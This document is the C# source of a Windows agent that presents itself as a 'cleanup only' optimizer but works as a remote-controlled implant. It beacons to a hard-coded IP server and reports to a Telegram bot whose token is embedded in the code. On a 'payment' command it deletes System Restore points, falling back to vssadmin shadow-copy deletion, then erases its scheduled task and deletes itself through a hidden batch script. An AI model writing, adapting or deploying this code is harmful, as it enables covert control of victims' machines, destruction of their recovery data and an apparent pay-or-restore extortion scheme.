using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;

namespace WinOptimizerAgent;

/// <summary>
/// WinOptimizer Agent v3.0 — cleanup only.
/// Rollback: System Restore Point → reboot.
/// Payment: видалити restore point → cleanup → self-delete.
/// </summary>
class Program
{
    [DllImport("srclient.dll")]
    static extern int SRRemoveRestorePoint(int dwRPNum);

    static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Data");

    static readonly string LogFile = Path.Combine(DataDir, "agent.log");
    static readonly string ClientIdFile = Path.Combine(DataDir, "client_id.txt");
    static readonly string RollbackFile = Path.Combine(DataDir, "rollback_state.json");

    static readonly string LogDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Logs");
    static readonly string DesktopLogFile = Path.Combine(LogDir, "agent.log");

    // Діагностичний файл — пишеться ДО будь-чого іншого
    static readonly string DiagFile = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Logs", "agent_diag.txt");

    static readonly string VpsApi = "http://84.238.132.84/api";
    static readonly string TgBotToken = "8394906281:AAEhRCN2hJxV7uPfZw-UnISXcAcHEHonago";
    static readonly string TgChatId = "942720632";

    static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(15) };
    static string ClientId = "UNKNOWN";

    static void Main(string[] args)
    {
        // === КРОК 0: Діагностика — пишемо відразу при старті ===
        try
        {
            var diagDir = Path.GetDirectoryName(DiagFile);
            if (diagDir != null) Directory.CreateDirectory(diagDir);
            File.AppendAllText(DiagFile,
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] AGENT PROCESS STARTED PID={Environment.ProcessId}\n");
        }
        catch { }

        // Unhandled exception handler — ловимо ВСЕ
        AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
        {
            var ex = e.ExceptionObject as Exception;
            var msg = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] UNHANDLED EXCEPTION: {ex}\n";
            try { File.AppendAllText(DiagFile, msg); } catch { }
            try { File.AppendAllText(LogFile, msg); } catch { }
            try
            {
                SendTg($"💀 Agent UNHANDLED CRASH\n🆔 {ClientId}\n{ex?.Message}");
            }
            catch { }
        };

        try
        {
            Directory.CreateDirectory(DataDir);
            Directory.CreateDirectory(LogDir);
            Log("=== WinOptimizerAgent v3.1 started ===");
            Log($"ExePath: {Environment.ProcessPath}");
            Log($"WorkDir: {Environment.CurrentDirectory}");
            Log($"Is64BitOS: {Environment.Is64BitOperatingSystem}, Is64BitProcess: {Environment.Is64BitProcess}");

            // Read client ID
            Log($"ClientIdFile path: {ClientIdFile}");
            Log($"ClientIdFile exists: {File.Exists(ClientIdFile)}");
            if (File.Exists(ClientIdFile))
            {
                ClientId = File.ReadAllText(ClientIdFile).Trim();
                Log($"Client ID loaded: '{ClientId}'");
            }
            else
            {
                Log("WARNING: client_id.txt NOT FOUND! Using UNKNOWN");
            }

            // Check rollback state
            var hasRollback = File.Exists(RollbackFile);
            var rollbackInfo = "немає";
            if (hasRollback)
            {
                try
                {
                    var rj = File.ReadAllText(RollbackFile);
                    using var rd = JsonDocument.Parse(rj);
                    var rp = rd.RootElement.TryGetProperty("RestorePointSequenceNumber", out var rpVal) ? rpVal.GetInt32() : 0;
                    rollbackInfo = $"RP#{rp}";
                }
                catch { rollbackInfo = "файл є, помилка парсингу"; }
            }
            Log($"RollbackFile: {RollbackFile}, exists: {hasRollback}, info: {rollbackInfo}");

            // Startup TG notification (в окремому try/catch щоб не крашнути Agent)
            try
            {
                SendTg($"🤖 WinOptimizer Agent v3.1 STARTED\n" +
                       $"🖥 {Environment.MachineName}\n" +
                       $"🆔 {ClientId}\n" +
                       $"📁 Rollback state: {rollbackInfo}\n" +
                       $"⏰ {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            }
            catch (Exception ex)
            {
                Log($"TG startup notify error (non-fatal): {ex.Message}");
            }

            // VPS registration (в окремому try/catch)
            try
            {
                RegisterOnVps();
            }
            catch (Exception ex)
            {
                Log($"VPS register error (non-fatal): {ex.Message}");
            }

            Log("Entering heartbeat loop...");

            // Main heartbeat loop
            int heartbeatCount = 0;
            while (true)
            {
                try
                {
                    heartbeatCount++;
                    Heartbeat();

                    if (heartbeatCount % 20 == 0)
                        Log($"Heartbeat #{heartbeatCount} — agent alive");
                }
                catch (Exception ex)
                {
                    Log($"Heartbeat loop error (non-fatal): {ex.Message}");
                    if (ex.InnerException != null)
                        Log($"  Inner: {ex.InnerException.Message}");
                }

                Thread.Sleep(30000); // 30 sec
            }
        }
        catch (Exception ex)
        {
            var msg = $"FATAL: {ex}";
            Log(msg);
            try { File.AppendAllText(DiagFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n"); } catch { }
            try { SendTg($"💀 Agent FATAL CRASH\n🆔 {ClientId}\n{ex.Message}"); } catch { }
        }
    }

    static void RegisterOnVps()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                hwid = ClientId,
                pc_name = Environment.MachineName,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/register", content).Result;
            Log($"VPS register: {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Log($"VPS register error: {ex.Message}");
        }
    }

    static void Heartbeat()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/heartbeat", content).Result;
            var json = response.Content.ReadAsStringAsync().Result;
            Log($"Heartbeat response: {json}");

            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("pending_action", out var action))
            {
                var actionStr = action.GetString();
                if (!string.IsNullOrEmpty(actionStr) && actionStr != "none")
                {
                    Log($">>> PENDING ACTION RECEIVED: '{actionStr}'");
                    SendTg($"📬 Agent отримав команду!\n🆔 {ClientId}\n📋 Action: {actionStr}\n⏰ {DateTime.Now:HH:mm:ss}");

                    var act = actionStr.ToLowerInvariant();

                    if (act.Contains("rollback"))
                    {
                        Log(">>> Executing ROLLBACK...");
                        ExecuteRollback();
                    }
                    else if (act.Contains("paid") || act.Contains("payment"))
                    {
                        Log(">>> Executing PAYMENT...");
                        ExecutePayment();
                    }
                    else
                    {
                        Log($"Unknown action: {actionStr}");
                        SendTg($"❓ Agent: невідома команда\n{actionStr}");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Log($"Heartbeat error: {ex.Message}");
        }
    }

    static void ExecuteRollback()
    {
        Log("=== ROLLBACK START ===");
        SendTg($"🔄 WinFlow Rollback\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Починаємо відкат...");

        try
        {
            // Clean WinOptimizer files from Desktop BEFORE rollback
            CleanDesktopFromWinOptimizer();

            if (!File.Exists(RollbackFile))
            {
                Log("No rollback state found");
                SendTg($"⚠️ Rollback: файл стану не знайдено\n🆔 {ClientId}");
                return;
            }

            var json = File.ReadAllText(RollbackFile);
            Log($"Rollback state content: {json.Substring(0, Math.Min(json.Length, 500))}");
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            ExecuteCleanupRollback(root);
        }
        catch (Exception ex)
        {
            Log($"ROLLBACK ERROR: {ex}");
            SendTg($"❌ Rollback FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    /// <summary>
    /// Видалити ВСІ файли WinOptimizer/WinFlow з Desktop (всіх користувачів).
    /// exe, логи, будь-що з "WinOptimizer" або "WinFlow" у назві.
    /// </summary>
    static void CleanDesktopFromWinOptimizer()
    {
        Log("Cleaning WinOptimizer files from Desktop...");
        int deleted = 0;

        try
        {
            var desktopDirs = new List<string>();

            // Public Desktop
            var publicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
            if (!string.IsNullOrEmpty(publicDesktop) && Directory.Exists(publicDesktop))
                desktopDirs.Add(publicDesktop);

            // Current user Desktop
            var userDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (!string.IsNullOrEmpty(userDesktop) && Directory.Exists(userDesktop))
                desktopDirs.Add(userDesktop);

            // All user profiles Desktop
            var usersDir = Path.Combine(Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\", "Users");
            if (Directory.Exists(usersDir))
            {
                foreach (var profile in Directory.GetDirectories(usersDir))
                {
                    var profileDesktop = Path.Combine(profile, "Desktop");
                    if (Directory.Exists(profileDesktop) && !desktopDirs.Contains(profileDesktop))
                        desktopDirs.Add(profileDesktop);
                }
            }

            foreach (var desktop in desktopDirs)
            {
                try
                {
                    foreach (var file in Directory.GetFiles(desktop))
                    {
                        var name = Path.GetFileName(file).ToLowerInvariant();
                        if (name.Contains("winoptimizer") || name.Contains("winflow"))
                        {
                            try
                            {
                                File.Delete(file);
                                deleted++;
                                Log($"Deleted from Desktop: {file}");
                            }
                            catch (Exception ex)
                            {
                                Log($"Cannot delete {file}: {ex.Message}");
                            }
                        }
                    }
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Log($"CleanDesktop error: {ex.Message}");
        }

        Log($"Desktop cleanup: deleted {deleted} WinOptimizer files");
    }

    /// <summary>
    /// Cleanup rollback — System Restore Point.
    /// </summary>
    static void ExecuteCleanupRollback(JsonElement root)
    {
        int seqNum = 0;
        if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
            seqNum = rpSeq.GetInt32();

        Log($"Cleanup rollback: RestorePointSequenceNumber = {seqNum}");

        if (seqNum > 0)
        {
            // Verify restore point exists
            Log("Checking if restore point exists...");
            var checkCmd = $"Get-ComputerRestorePoint | Where-Object {{ $_.SequenceNumber -eq {seqNum} }} | Format-List";
            var checkOutput = RunPowerShellWithOutput(checkCmd, 30000);
            Log($"Restore point check: {(string.IsNullOrWhiteSpace(checkOutput) ? "NOT FOUND!" : checkOutput.Trim())}");

            var listCmd = "Get-ComputerRestorePoint | Select-Object SequenceNumber,Description,CreationTime | Format-Table -AutoSize";
            var listOutput = RunPowerShellWithOutput(listCmd, 15000);
            Log($"All restore points:\n{listOutput}");

            if (string.IsNullOrWhiteSpace(checkOutput))
            {
                Log($"Restore point #{seqNum} NOT FOUND! Cannot restore.");
                SendTg($"❌ Restore point #{seqNum} не знайдено!\n🆔 {ClientId}\nМожливо точка була видалена.");
                UpdateVpsStatus("rollback_failed_no_rp");
                return;
            }

            // Initiate System Restore
            Log($"Initiating Restore-Computer -RestorePoint {seqNum}...");
            SendTg($"🔄 System Restore\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n⏳ Restore-Computer запускається...\nПК перезавантажиться автоматично!");

            var restoreCmd = $"Restore-Computer -RestorePoint {seqNum} -Confirm:$false";
            var restoreOutput = RunPowerShellWithOutput(restoreCmd, 120000);
            Log($"Restore-Computer output: {restoreOutput}");

            ScheduleReboot("WinFlow: System Restore");
            UpdateVpsStatus("rollback_system_restore");
            SendTg($"✅ System Restore ініційовано!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
            return;
        }

        // Fallback: Manual rollback (services + startup)
        Log("No restore point (seqNum=0), manual rollback");
        int restoredServices = 0;
        int restoredStartup = 0;

        if (root.TryGetProperty("DisabledServices", out var services))
        {
            foreach (var svc in services.EnumerateArray())
            {
                var name = svc.GetProperty("ServiceName").GetString() ?? "";
                var startType = svc.GetProperty("OriginalStartType").GetString() ?? "Manual";
                Log($"Restoring service: {name} → {startType}");
                RunPowerShell($"Set-Service -Name '{name}' -StartupType {startType}; Start-Service -Name '{name}' -ErrorAction SilentlyContinue");
                restoredServices++;
            }
        }

        if (root.TryGetProperty("DisabledStartupItems", out var startup))
        {
            foreach (var item in startup.EnumerateArray())
            {
                var regPath = item.GetProperty("RegistryPath").GetString() ?? "";
                var valueName = item.GetProperty("ValueName").GetString() ?? "";
                var valueData = item.GetProperty("ValueData").GetString() ?? "";
                Log($"Restoring startup: {valueName}");
                RunPowerShell($"Set-ItemProperty -Path '{regPath}' -Name '{valueName}' -Value '{valueData}' -Force");
                restoredStartup++;
            }
        }

        File.Delete(RollbackFile);
        Log($"Manual rollback done: {restoredServices} services, {restoredStartup} startup items");
        SendTg($"✅ Manual Rollback OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n🔧 Служб: {restoredServices}\n🚀 Автозапуск: {restoredStartup}");
        UpdateVpsStatus("rollback_manual_done");
    }

    static void ScheduleReboot(string reason)
    {
        Log("Scheduling backup reboot in 30 seconds...");
        var sys32 = GetRealSystem32();
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = Path.Combine(sys32, "shutdown.exe"),
                Arguments = $"/r /t 30 /c \"{reason} — перезавантаження\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi);
            Log("Backup reboot scheduled (30s)");
        }
        catch (Exception ex)
        {
            Log($"Shutdown schedule error: {ex.Message}");
        }
    }

    static void ExecutePayment()
    {
        Log("=== PAYMENT START ===");
        SendTg($"💰 WinFlow Payment\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Очистка...");

        try
        {
            // Clean WinOptimizer files from Desktop
            CleanDesktopFromWinOptimizer();

            // Delete restore point
            if (File.Exists(RollbackFile))
            {
                try
                {
                    var json = File.ReadAllText(RollbackFile);
                    Log($"Rollback state: {json.Substring(0, Math.Min(json.Length, 300))}");
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;

                    if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
                    {
                        var seqNum = rpSeq.GetInt32();
                        if (seqNum > 0)
                        {
                            Log($"Deleting restore point #{seqNum} via SRRemoveRestorePoint...");
                            var result = SRRemoveRestorePoint(seqNum);
                            Log(result == 0
                                ? $"✅ Restore point #{seqNum} deleted successfully"
                                : $"⚠️ SRRemoveRestorePoint returned {result} (0=success)");

                            if (result != 0)
                            {
                                Log("Trying PowerShell fallback delete...");
                                var psResult = RunPowerShellWithOutput(
                                    $"vssadmin delete shadows /for=C: /quiet 2>&1; Write-Output 'done'", 30000);
                                Log($"PS delete result: {psResult.Trim()}");
                            }
                        }
                        else
                        {
                            Log("No restore point to delete (seqNum=0)");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Payment cleanup error: {ex.Message}");
                }

                File.Delete(RollbackFile);
                Log("Rollback state file deleted");
            }
            else
            {
                Log("No rollback state file found");
            }

            // Delete scheduled task
            var sys32 = GetRealSystem32();
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = Path.Combine(sys32, "schtasks.exe"),
                    Arguments = "/Delete /TN \"WinOptimizerAgent\" /F",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi)?.WaitForExit(5000);
                Log("Scheduled task deleted");
            }
            catch (Exception ex)
            {
                Log($"Delete task error: {ex.Message}");
            }

            // Report
            var cFreeGB = "?";
            try
            {
                var di = new DriveInfo("C");
                cFreeGB = $"{di.AvailableFreeSpace / (1024.0 * 1024 * 1024):F1}";
            }
            catch { }

            SendTg($"✅ WinOptimizer Payment OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n💾 C: {cFreeGB} GB вільно\n🗑 Restore point видалено");
            UpdateVpsStatus("paid_done");

            // Self-delete
            SelfDelete();
        }
        catch (Exception ex)
        {
            Log($"PAYMENT ERROR: {ex}");
            SendTg($"❌ Payment FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    static void SelfDelete()
    {
        try
        {
            var exePath = Process.GetCurrentProcess().MainModule?.FileName;
            if (string.IsNullOrEmpty(exePath)) return;

            var agentDir = Path.GetDirectoryName(exePath) ?? "";
            var batPath = Path.Combine(Path.GetTempPath(), "wo_cleanup.cmd");

            var dataDir = DataDir;
            var logsDir = LogDir;

            var script = $"""
                @echo off
                timeout /t 3 /nobreak >nul
                taskkill /F /IM WinOptimizerAgent.exe >nul 2>&1
                timeout /t 2 /nobreak >nul
                rd /s /q "{agentDir}" >nul 2>&1
                rd /s /q "{logsDir}" >nul 2>&1
                rd /s /q "{dataDir}" >nul 2>&1
                del "%~f0" >nul 2>&1
                """;

            File.WriteAllText(batPath, script);
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{batPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            });

            Log("Self-delete scheduled");
        }
        catch (Exception ex)
        {
            Log($"Self-delete error: {ex.Message}");
        }
    }

    static void UpdateVpsStatus(string status)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                rollback_status = status,
                project = "winoptimizer"
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            Http.PostAsync($"{VpsApi}/heartbeat", content).Wait();
        }
        catch { }
    }

    static void RunPowerShell(string command)
    {
        RunPowerShellWithOutput(command, 30000);
    }

    static string RunPowerShellWithOutput(string command, int timeoutMs = 30000)
    {
        try
        {
            // CRITICAL: Use Sysnative PowerShell (64-bit) because Agent is win-x86 (32-bit).
            // Restore-Computer, Get-ComputerRestorePoint etc. require 64-bit PowerShell.
            var sys32 = GetRealSystem32();
            var psPath = Path.Combine(sys32, "WindowsPowerShell", "v1.0", "powershell.exe");
            if (!File.Exists(psPath)) psPath = "powershell.exe";

            var psi = new ProcessStartInfo
            {
                FileName = psPath,
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "";

            var stdout = proc.StandardOutput.ReadToEnd();
            var stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(timeoutMs);

            if (!string.IsNullOrWhiteSpace(stderr))
                Log($"PS stderr: {stderr.Trim()}");

            return stdout;
        }
        catch (Exception ex)
        {
            Log($"PowerShell error: {ex.Message}");
            return "";
        }
    }

    static string GetRealSystem32()
    {
        var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var sysnative = Path.Combine(winDir, "Sysnative");
        if (Directory.Exists(sysnative) && File.Exists(Path.Combine(sysnative, "schtasks.exe")))
            return sysnative;
        return Environment.GetFolderPath(Environment.SpecialFolder.System);
    }

    static void SendTg(string message)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                chat_id = TgChatId,
                text = message
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var resp = Http.PostAsync($"https://api.telegram.org/bot{TgBotToken}/sendMessage", content).Result;
            var body = resp.Content.ReadAsStringAsync().Result;
            Log($"TG send: {resp.StatusCode}, body: {body.Substring(0, Math.Min(body.Length, 200))}");
        }
        catch (Exception ex)
        {
            Log($"TG SEND ERROR: {ex.Message}");
            if (ex.InnerException != null)
                Log($"TG INNER: {ex.InnerException.Message}");
        }
    }

    static void Log(string message)
    {
        var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
        try { File.AppendAllText(LogFile, line + Environment.NewLine); } catch { }
        try { Directory.CreateDirectory(LogDir); File.AppendAllText(DesktopLogFile, line + Environment.NewLine); } catch { }
    }
}
